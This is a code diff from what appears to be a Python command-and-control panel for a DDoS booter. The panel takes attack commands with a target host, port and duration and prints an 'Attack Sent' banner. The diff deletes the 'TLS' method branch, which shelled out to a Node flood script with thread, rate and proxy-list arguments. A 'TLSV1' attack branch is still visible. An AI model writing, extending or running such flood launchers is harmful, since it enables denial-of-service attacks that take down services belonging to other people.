@@ -74,28 +74,7 @@ def main():
         elif cnc == "clear" or cnc == "CLEAR" or cnc == "CLS" or cnc == "cls":
             clear()
 
-        elif "TLS" in cnc:
-            try: 
-                host = cnc.split()[1]
-                port = cnc.split()[2]
-                time = cnc.split()[3]
-                print(Colorate.Diagonal(Colors.yellow_to_red, f'''
-                ╔═══════════════════════════════════════════════╗
-                                           Attack Sent
-
-                          Target: [ {host} ]
-                          Time: [ {time} ]
-                          Port: [ {port}
-                          Method: [ TLS ]
-                          Attack By User: [ {username} ]
-                          Role: [ {Role} ]
-                          
-                ╚═══════════════════════════════════════════════╝
-                '''))
-                os.system(f'node TLS.js {host} {time} 64 1000 proxy.txt')
-            except IndexError:
-                print(Colorate.Diagonal(Colors.yellow_to_red, 'Usage: METHOD URL PORT TIME'));
-                print(Colorate.Diagonal(Colors.yellow_to_red, 'Example: METHOD URL PORT TIME'));
+      
                 
         elif "TLSV1" in cnc:
             try: 
